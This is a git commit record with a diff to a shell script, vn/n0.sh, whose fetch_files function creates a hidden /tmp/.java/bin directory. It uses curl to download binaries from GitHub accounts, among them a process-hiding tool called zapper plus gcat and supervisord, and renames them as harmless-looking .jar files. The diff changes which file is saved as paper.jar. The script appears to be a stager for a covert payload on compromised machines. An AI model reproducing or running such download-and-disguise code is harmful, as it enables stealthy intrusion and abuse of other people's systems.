b1879be0a35cabb49bcdf3fd1244ccaa790b5cc4
i51jir6ni9t0 <wker-one@protonmail.com>
2025-02-25 15:27:28 +0000

    VN-TEST

--- vn/n0.sh
+++ vn/n0.sh
@@ -2,9 +2,10 @@
 
 function fetch_files() {
     mkdir -p /tmp/.java/bin
+    # cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o paper.jar
     cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
-    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o paper.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o paper.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/vn/cfg.conf -o cfg.conf
     cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/vn/cnf.json -o conf.json
